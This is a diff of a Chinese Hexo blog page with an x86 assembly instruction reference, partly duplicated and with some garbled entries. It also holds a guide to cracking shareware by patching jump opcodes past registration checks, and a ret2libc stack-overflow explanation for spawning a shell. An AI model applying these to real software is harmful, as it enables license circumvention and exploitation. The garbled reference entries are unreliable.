-<h3 id="2。-输入输出端口传送指令。"><a href="#2。-输入输出端口传送指令。" class="headerlink" title="2。 输入输出端口传送指令。"></a>2。 输入输出端口传送指令。</h3><p>IN I&#x2F;O端口输入。 ( 语法: IN 累加器， {端口号│DX} )<br>OUT I&#x2F;O端口输出。 ( 语法: OUT {端口号│DX}，累加器 )<br>输入输出端口由立即方式指定时， 其范围是 0-255; 由寄存器 DX 指定时，<br>其范围是 0-65535。</p>
-<h3 id="3。-目的地址传送指令。"><a href="#3。-目的地址传送指令。" class="headerlink" title="3。 目的地址传送指令。"></a>3。 目的地址传送指令。</h3><p>LEA 装入有效地址。<br>例: LEA DX，string ;把偏移地址存到DX。<br>LDS 传送目标指针，把指针内容装入DS。<br>例: LDS SI，string ;把段地址:偏移地址存到DS:SI。<br>LES 传送目标指针，把指针内容装入ES。<br>例: LES DI，string ;把段地址:偏移地址存到ES:DI。<br>LFS 传送目标指针，把指针内容装入FS。<br>例: LFS DI，string ;把段地址:偏移地址存到FS:DI。<br>LGS 传送目标指针，把指针内容装入GS。<br>例: LGS DI，string ;把段地址:偏移地址存到GS:DI。<br>LSS 传送目标指针，把指针内容装入SS。<br>例: LSS DI，string ;把段地址:偏移地址存到SS:DI。</p>
-<h3 id="4。-标志传送指令。"><a href="#4。-标志传送指令。" class="headerlink" title="4。 标志传送指令。"></a>4。 标志传送指令。</h3><p>LAHF 标志寄存器传送，把标志装入AH。<br>SAHF 标志寄存器传送，把AH内容装入标志寄存器。<br>PUSHF 标志入栈。<br>POPF 标志出栈。<br>PUSHD 32位标志入栈。<br>POPD 32位标志出栈。</p>
-<h2 id="二、算术运算指令"><a href="#二、算术运算指令" class="headerlink" title="二、算术运算指令"></a>二、算术运算指令</h2><p>──────────────────────────────<br>ADD 加法。<br>ADC 带进位加法。<br>INC 加 1。<br>AAA 加法的ASCII码调整。<br>DAA 加法的十进制调整。<br>SUB 减法。<br>SBB 带借位减法。<br>DEC 减 1。<br>NEC 求反(以 0 减之)。<br>CMP 比较。(两操作数作减法，仅修改标志位，不回送结果)。<br>AAS 减法的ASCII码调整。<br>DAS 减法的十进制调整。<br>MUL 无符号乘法。<br>IMUL 整数乘法。<br>以上两条，结果回送AH和AL(字节运算)，或DX和AX(字运算)，<br>AAM 乘法的ASCII码调整。<br>DIV 无符号除法。<br>IDIV 整数除法。<br>以上两条，结果回送:<br>商回送AL，余数回送AH， (字节运算);<br>或 商回送AX，余数回送DX， (字运算)。<br>AAD 除法的ASCII码调整。<br>CBW 字节转换为字。 (把AL中字节的符号扩展到AH中去)<br>CWD 字转换为双字。 (把AX中的字的符号扩展到DX中去)<br>CWDE 字转换为双字。 (把AX中的字符号扩展到EAX中去)<br>CDQ 双字扩展。 (把EAX中的字的符号扩展到EDX中去)</p>
-<h2 id="三、逻辑运算指令"><a href="#三、逻辑运算指令" class="headerlink" title="三、逻辑运算指令"></a>三、逻辑运算指令</h2><p>────────────────────────────<br>AND 与运算。<br>OR 或运算。<br>XOR 异或运算。<br>NOT 取反。<br>TEST 测试。(两操作数作与运算，仅修改标志位，不回送结果)。<br>SHL 逻辑左移。<br>SAL 算术左移。(&#x3D;SHL)<br>SHR 逻辑右移。<br>SAR 算术右移。(&#x3D;SHR)<br>ROL 循环左移。<br>ROR 循环右移。<br>RCL 通过进位的循环左移。<br>RCR 通过进位的循环右移。<br>以上八种移位指令，其移位次数可达255次。<br>移位一次时， 可直接用操作码。 如 SHL AX，1。<br>移位&gt;1次时， 则由寄存器CL给出移位次数。<br>如 MOV CL，04<br>SHL AX，CL</p>
-<h2 id="四、串指令"><a href="#四、串指令" class="headerlink" title="四、串指令"></a>四、串指令</h2><p>───────────────────────────<br>DS:SI 源串段寄存器 :源串变址。<br>ES:DI 目标串段寄存器:目标串变址。<br>CX 重复次数计数器。<br>AL&#x2F;AX 扫描值。<br>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量。<br>Z标志 用来控制扫描或比较操作的结束。<br>MOVS 串传送。<br>( MOVSB 传送字符。 MOVSW 传送字。 MOVSD 传送双字。 )<br>CMPS 串比较。<br>( CMPSB 比较字符。 CMPSW 比较字。 )<br>SCAS 串扫描。<br>把AL或AX的内容与目标串作比较，比较结果反映在标志位。<br>LODS 装入串。<br>把源串中的元素(字或字节)逐一装入AL或AX中。<br>( LODSB 传送字符。 LODSW 传送字。 LODSD 传送双字。 )<br>STOS 保存串。<br>是LODS的逆过程。<br>REP 当CX&#x2F;ECX&lt;&gt;0时重复。<br>REPE&#x2F;REPZ 当ZF&#x3D;1或比较结果相等，且CX&#x2F;ECX&lt;&gt;0时重复。<br>REPNE&#x2F;REPNZ 当ZF&#x3D;0或比较结果不相等，且CX&#x2F;ECX&lt;&gt;0时重复。<br>REPC 当CF&#x3D;1且CX&#x2F;ECX&lt;&gt;0时重复。<br>REPNC 当CF&#x3D;0且CX&#x2F;ECX&lt;&gt;0时重复。</p>
-<h2 id="五、程序转移指令"><a href="#五、程序转移指令" class="headerlink" title="五、程序转移指令"></a>五、程序转移指令</h2><p>──────────────────────────<br>1&gt;无条件转移指令 (长转移)<br>JMP 无条件转移指令<br>CALL 过程调用<br>RET&#x2F;RETF过程返回。<br>2&gt;条件转移指令 (短转移，-128到+127的距离内)<br>( 当且仅当(SF XOR OF)&#x3D;1时，OP1 JA&#x2F;JNBE 不小于或不等于时转移。<br>JAE&#x2F;JNB 大于或等于转移。<br>JB&#x2F;JNAE 小于转移。<br>JBE&#x2F;JNA 小于或等于转移。<br>以上四条，测试无符号整数运算的结果(标志C和Z)。<br>JG&#x2F;JNLE 大于转移。<br>JGE&#x2F;JNL 大于或等于转移。<br>JL&#x2F;JNGE 小于转移。<br>JLE&#x2F;JNG 小于或等于转移。<br>以上四条，测试带符号整数运算的结果(标志S，O和Z)。<br>JE&#x2F;JZ 等于转移。<br>JNE&#x2F;JNZ 不等于时转移。<br>JC 有进位时转移。<br>JNC 无进位时转移。<br>JNO 不溢出时转移。<br>JNP&#x2F;JPO 奇偶性为奇数时转移。<br>JNS 符号位为 “0” 时转移。<br>JO 溢出转移。<br>JP&#x2F;JPE 奇偶性为偶数时转移。<br>JS 符号位为 “1” 时转移。<br>3&gt;循环控制指令(短转移)<br>LOOP CX不为零时循环。<br>LOOPE&#x2F;LOOPZ CX不为零且标志Z&#x3D;1时循环。<br>LOOPNE&#x2F;LOOPNZ CX不为零且标志Z&#x3D;0时循环。<br>JCXZ CX为零时转移。<br>JECXZ ECX为零时转移。<br>4&gt;中断指令<br>INT 中断指令<br>INTO 溢出中断<br>IRET 中断返回<br>5&gt;处理器控制指令<br>HLT 处理器暂停， 直到出现中断或复位信号才继续。<br>WAIT 当芯片引线TEST为高电平时使CPU进入等待状态。<br>ESC 转换到外处理器。<br>LOCK 封锁总线。<br>NOP 空操作。<br>STC 置进位标志位。<br>CLC 清进位标志位。<br>CMC 进位标志取反。<br>STD 置方向标志位。<br>CLD 清方向标志位。<br>STI 置中断允许位。<br>CLI 清中断允许位。</p>
-<h2 id="六、伪指令"><a href="#六、伪指令" class="headerlink" title="六、伪指令"></a>六、伪指令</h2><p>───────────────────────────<br>DW 定义字(2字节)。<br>PROC 定义过程。<br>ENDP 过程结束。<br>SEGMENT 定义段。<br>ASSUME 建立段寄存器寻址。<br>ENDS 段结束。<br>END 程序结束。</p>
-<p><strong>一.机械码,又称机器码.</strong>**<br><strong>ultraedit打开,编辑exe文件时你会看到</strong><br><strong>许许多多的由0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F组成的数码,这些数码</strong><br><strong>就是机器码.</strong><br><strong>修改程序时必须通过修改机器码来修改exe文件.</strong></p>
-<p><strong>二.需要熟练掌握的全部汇编知识(只有这么多)</strong><br><strong>不大容易理解,可先强行背住,混个脸儿熟,以后慢慢的就理解了</strong><br><strong>cmp a,b 比较a与b</strong><br><strong>mov a,b 把b的值送给a</strong><br><strong>ret 返回主程序</strong><br><strong>nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码90)机器码的含义参看上面</strong>**<br>***(解释:ultraedit打开编辑exe文件时你看到90,等同于汇编语句nop)**<br><strong>call 调用子程序</strong><br><strong>je 或jz 若相等则跳(机器码74 或0F84)</strong><br><strong>jne或jnz 若不相等则跳(机器码75或0F85)</strong><br><strong>jmp 无条件跳(机器码EB)</strong><br><strong>jb 若小于则跳</strong><br><strong>ja 若大于则跳</strong><br><strong>jg 若大于则跳</strong><br><strong>jge 若大于等于则跳</strong><br><strong>jl 若小于则跳</strong><br><strong>jle 若小于等于则跳</strong><br><strong>pop 出栈</strong><br><strong>push 压栈</strong></p>
-<p><strong>三.常见修改(机器码)</strong><br><strong>74&#x3D;&gt;75 74&#x3D;&gt;90 74&#x3D;&gt;EB</strong><br><strong>75&#x3D;&gt;74 75&#x3D;&gt;90 75&#x3D;&gt;EB</strong></p>
-<p><strong>jnz-&gt;nop</strong><br><strong>75-&gt;90(相应的机器码修改)</strong></p>
-<p><strong>jnz -&gt; jmp</strong><br><strong>75 -&gt; EB(相应的机器码修改)</strong></p>
-<p><strong>jnz -&gt; jz</strong><br><strong>75-&gt;74 (正常) 0F 85 -&gt; 0F 84(特殊情况下,有时,相应的机器码修改)</strong></p>
-<p><strong>四.两种不同情况的不同修改方法</strong><br><strong>1.修改为jmp</strong><br><strong>je(jne,jz,jnz) &#x3D;&gt;jmp相应的机器码EB （出错信息向上找到的第一个跳转）jmp的作用是绝对跳，无条件跳，从而跳过下面的出错信息</strong></p>
-<p><strong>xxxxxxxxxxxx 出错信息，例如：注册码不对，sorry,未注册版不能…，”Function Not Avaible in Demo” 或 “Command Not Avaible” 或 “Can’t save in Shareware&#x2F;Demo”等 （我们希望把它跳过，不让它出现）</strong><br><strong>。。。</strong><br><strong>。。。</strong><br><strong>xxxxxxxxxxxx 正确路线所在</strong></p>
-<p><strong>2.修改为nop</strong><br><strong>je(jne,jz,jnz) &#x3D;&gt;nop相应的机器码90 （正确信息向上找到的第一个跳转） nop的作用是抹掉这个跳转，使这个跳转无效，失去作用，从而使程序顺利来到紧跟其后的正确信息处</strong></p>
-<p><strong>xxxxxxxxxxxx 正确信息，例如：注册成功，谢谢您的支持等（我们希望它不被跳过，让它出现，程序一定要顺利来到这里）</strong><br><strong>。。。</strong><br><strong>。。。</strong><br><strong>xxxxxxxxxxxx 出错信息（我们希望不要跳到这里，不让它出现）它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据.</strong> </p>
-<ol>
-<li><strong>通用数据传送指令.</strong><br><strong>MOV 传送字或字节.</strong><br><strong>MOVSX 先符号扩展,再传送.</strong><br><strong>MOVZX 先零扩展,再传送.</strong><br><strong>PUSH 把字压入堆栈.</strong><br><strong>POP 把字弹出堆栈.</strong><br><strong>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈.</strong><br><strong>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈.</strong><br><strong>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈.</strong><br><strong>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈.</strong><br><strong>BSWAP 交换32位寄存器里字节的顺序</strong><br><strong>XCHG 交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</strong><br><strong>CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL&#x2F;AX&#x2F;EAX )</strong><br><strong>XADD 先交换再累加.( 结果在第一个操作数里 )</strong><br><strong>XLAT 字节查表转换.</strong><br><strong>── BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即</strong><br><strong>0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL )</strong></li>
-<li><strong>输入输出端口传送指令.</strong><br><strong>IN I&#x2F;O端口输入. ( 语法: IN 累加器, {端口号│DX} )</strong><br><strong>OUT I&#x2F;O端口输出. ( 语法: OUT {端口号│DX},累加器 )</strong><br><strong>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,</strong><br><strong>其范围是 0-65535.</strong></li>
-<li><strong>目的地址传送指令.</strong><br><strong>LEA 装入有效地址.</strong><br><strong>例: LEA DX,string ;把偏移地址存到DX.</strong><br><strong>LDS 传送目标指针,把指针内容装入DS.</strong><br><strong>例: LDS SI,string ;把段地址:偏移地址存到DS:SI.</strong><br><strong>LES 传送目标指针,把指针内容装入ES.</strong><br><strong>例: LES DI,string ;把段地址:偏移地址存到ESI.</strong><br><strong>LFS 传送目标指针,把指针内容装入FS.</strong><br><strong>例: LFS DI,string ;把段地址:偏移地址存到FSI.</strong><br><strong>LGS 传送目标指针,把指针内容装入GS.</strong><br><strong>例: LGS DI,string ;把段地址:偏移地址存到GSI.</strong><br><strong>LSS 传送目标指针,把指针内容装入SS.</strong><br><strong>例: LSS DI,string ;把段地址:偏移地址存到SSI.</strong> </li>
-<li><strong>标志传送指令.</strong><br><strong>LAHF 标志寄存器传送,把标志装入AH.</strong><br><strong>SAHF 标志寄存器传送,把AH内容装入标志寄存器.</strong><br><strong>PUSHF 标志入栈.</strong><br><strong>POPF 标志出栈.</strong><br><strong>PUSHD 32位标志入栈.</strong><br><strong>POPD 32位标志出栈.</strong></li>
-</ol>
-<p><strong>二、算术运算指令</strong><br><strong>───────────────────────────────────────</strong><br><strong>ADD 加法.</strong><br><strong>ADC 带进位加法.</strong><br><strong>INC 加 1.</strong><br><strong>AAA 加法的ASCII码调整.</strong><br><strong>DAA 加法的十进制调整.</strong><br><strong>SUB 减法.</strong> （其中sub ax,bx就是ax中的值减bx中的值，然后把结果放入ax中。）<br><strong>SBB 带借位减法.</strong><br><strong>DEC 减 1.</strong><br><strong>NEC 求反(以 0 减之).</strong><br><strong>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果).</strong><br><strong>AAS 减法的ASCII码调整.</strong><br><strong>DAS 减法的十进制调整.</strong><br><strong>MUL 无符号乘法.</strong><br><strong>IMUL 整数乘法.</strong><br><strong>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算),</strong><br><strong>AAM 乘法的ASCII码调整.</strong><br><strong>DIV 无符号除法.</strong><br><strong>IDIV 整数除法.</strong><br><strong>以上两条,结果回送:</strong><br><strong>商回送AL,余数回送AH, (字节运算);</strong><br><strong>或 商回送AX,余数回送DX, (字运算).</strong><br><strong>AAD 除法的ASCII码调整.</strong><br><strong>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</strong><br><strong>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</strong><br><strong>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</strong><br><strong>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</strong></p>
-<p><strong>三、逻辑运算指令</strong><br><strong>───────────────────────────────────────</strong><br><strong>AND 与运算.</strong><br><strong>OR 或运算.</strong><br><strong>XOR 异或运算.</strong><br><strong>NOT 取反.</strong><br><strong>TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果).</strong><br><strong>SHL 逻辑左移.</strong><br><strong>SAL 算术左移.(&#x3D;SHL)</strong><br><strong>SHR 逻辑右移.</strong><br><strong>SAR 算术右移.(&#x3D;SHR)</strong><br><strong>ROL 循环左移.</strong><br><strong>ROR 循环右移.</strong><br><strong>RCL 通过进位的循环左移.</strong><br><strong>RCR 通过进位的循环右移.</strong><br><strong>以上八种移位指令,其移位次数可达255次.</strong><br><strong>移位一次时, 可直接用操作码. 如 SHL AX,1.</strong><br><strong>移位&gt;1次时, 则由寄存器CL给出移位次数.</strong><br><strong>如 MOV CL,04</strong><br><strong>SHL AX,CL</strong> </p>
-<p><strong>四、串指令</strong><br><strong>───────────────────────────────────────</strong><br><strong>DS:SI 源串段寄存器 :源串变址.</strong><br><strong>ESI 目标串段寄存器:目标串变址.</strong><br><strong>CX 重复次数计数器.</strong><br><strong>AL&#x2F;AX 扫描值.</strong><br><strong>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量.</strong><br><strong>Z标志 用来控制扫描或比较操作的结束.</strong><br><strong>MOVS 串传送.</strong><br><strong>( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )</strong><br><strong>CMPS 串比较.</strong><br><strong>( CMPSB 比较字符. CMPSW 比较字. )</strong><br><strong>SCAS 串扫描.</strong><br><strong>把AL或AX的内容与目标串作比较,比较结果反映在标志位.</strong><br><strong>LODS 装入串.</strong><br><strong>把源串中的元素(字或字节)逐一装入AL或AX中.</strong><br><strong>( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. )</strong><br><strong>STOS 保存串.</strong><br><strong>是LODS的逆过程.</strong><br><strong>REP 当CX&#x2F;ECX&lt;&gt;0时重复.</strong><br><strong>REPE&#x2F;REPZ 当ZF&#x3D;1或比较结果相等,且CX&#x2F;ECX&lt;&gt;0时重复.</strong><br><strong>REPNE&#x2F;REPNZ 当ZF&#x3D;0或比较结果不相等,且CX&#x2F;ECX&lt;&gt;0时重复.</strong><br><strong>REPC 当CF&#x3D;1且CX&#x2F;ECX&lt;&gt;0时重复.</strong><br><strong>REPNC 当CF&#x3D;0且CX&#x2F;ECX&lt;&gt;0时重复.</strong> </p>
-<p><strong>五、程序转移指令</strong><br><strong>───────────────────────────────────────</strong><br><strong>1&gt;无条件转移指令 (长转移)</strong><br><strong>JMP 无条件转移指令</strong><br><strong>CALL 过程调用</strong><br><strong>RET&#x2F;RETF过程返回.</strong><br><strong>2&gt;条件转移指令 (短转移,-128到+127的距离内)</strong><br><strong>( 当且仅当(SF XOR OF)&#x3D;1时,OP1&lt;OP2 )**<br>**JA&#x2F;JNBE 不小于或不等于时转移.**<br>**JAE&#x2F;JNB 大于或等于转移.**<br>**JB&#x2F;JNAE 小于转移.**<br>**JBE&#x2F;JNA 小于或等于转移.**<br>**以上四条,测试无符号整数运算的结果(标志C和Z).**<br>**JG&#x2F;JNLE 大于转移.**<br>**JGE&#x2F;JNL 大于或等于转移.**<br>**JL&#x2F;JNGE 小于转移.**<br>**JLE&#x2F;JNG 小于或等于转移.**<br>**以上四条,测试带符号整数运算的结果(标志S,O和Z).**<br>**JE&#x2F;JZ 等于转移.**<br>**JNE&#x2F;JNZ 不等于时转移.**<br>**JC 有进位时转移.**<br>**JNC 无进位时转移.**<br>**JNO 不溢出时转移.**<br>**JNP&#x2F;JPO 奇偶性为奇数时转移.**<br>**JNS 符号位为 “0” 时转移.**<br>**JO 溢出转移.**<br>**JP&#x2F;JPE 奇偶性为偶数时转移.**<br>**JS 符号位为 “1” 时转移.**<br>**3&gt;循环控制指令(短转移)</strong><br><strong>LOOP CX不为零时循环.</strong><br><strong>LOOPE&#x2F;LOOPZ CX不为零且标志Z&#x3D;1时循环.</strong><br><strong>LOOPNE&#x2F;LOOPNZ CX不为零且标志Z&#x3D;0时循环.</strong><br><strong>JCXZ CX为零时转移.</strong><br><strong>JECXZ ECX为零时转移.</strong><br><strong>4&gt;中断指令</strong><br><strong>INT 中断指令</strong><br><strong>INTO 溢出中断</strong><br><strong>IRET 中断返回</strong><br><strong>5&gt;处理器控制指令</strong><br><strong>HLT 处理器暂停, 直到出现中断或复位信号才继续.</strong><br><strong>WAIT 当芯片引线TEST为高电平时使CPU进入等待状态.</strong><br><strong>ESC 转换到外处理器.</strong><br><strong>LOCK 封锁总线.</strong><br><strong>NOP 空操作.</strong><br><strong>STC 置进位标志位.</strong><br><strong>CLC 清进位标志位.</strong><br><strong>CMC 进位标志取反.</strong><br><strong>STD 置方向标志位.</strong><br><strong>CLD 清方向标志位.</strong><br><strong>STI 置中断允许位.</strong><br><strong>CLI 清中断允许位.</strong> </p>
-<p><strong>六、伪指令</strong><br><strong>───────────────────────────────────────</strong><br><strong>DW 定义字(2字节).</strong><br><strong>PROC 定义过程.</strong><br><strong>ENDP 过程结束.</strong><br><strong>SEGMENT 定义段.</strong><br><strong>ASSUME 建立段寄存器寻址.</strong><br><strong>ENDS 段结束.</strong><br><strong>END 程序结束</strong><br><strong>————————————————</strong>**</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/08/Leave%E6%8C%87%E4%BB%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/08/Leave%E6%8C%87%E4%BB%A4/" class="post-title-link" itemprop="url">MyBlog</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-12-08 22:03:46" itemprop="dateCreated datePublished" datetime="2023-12-08T22:03:46+08:00">2023-12-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-04-16 22:02:50" itemprop="dateModified" datetime="2024-04-16T22:02:50+08:00">2024-04-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>leave：leave指令将RSP寄存器的内容复制到RBP寄存器中,然后RSP寄存器的地址+8。<br>当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，然后将ebp+8字节的位置的数据当作函数的参数，所以如果我们想将&#x2F;bin&#x2F;sh作为system函数的参数，就可以在栈溢出的时候，先修改eip为system函数的地址，然后填充4个字节的垃圾数据，再将&#x2F;bin&#x2F;sh的地址写入栈上，这样调用system函数的时候，就可以将&#x2F;bin&#x2F;sh作为参数，然后返回一个shell。</p>
-<p><img src="https://img-blog.csdnimg.cn/da5ca471954c4957b575e41321e3fc64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_17,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>注意： 为什么是在eip（即system函数地址）后面覆盖4个字节垃圾数据而不是前面提到的8个字节，这是因为当我们调用system函数的时候，在system函数中会首先执行push ebp指令，将4字节的ebp地址压入栈中，而此时的栈底距离我们的参数&#x2F;bin&#x2F;sh正好8字节，所以我们应该填充4字节垃圾数据。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/08/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-12-08 20:24:20" itemprop="dateCreated datePublished" datetime="2023-12-08T20:24:20+08:00">2023-12-08</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1016,7 +1152,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
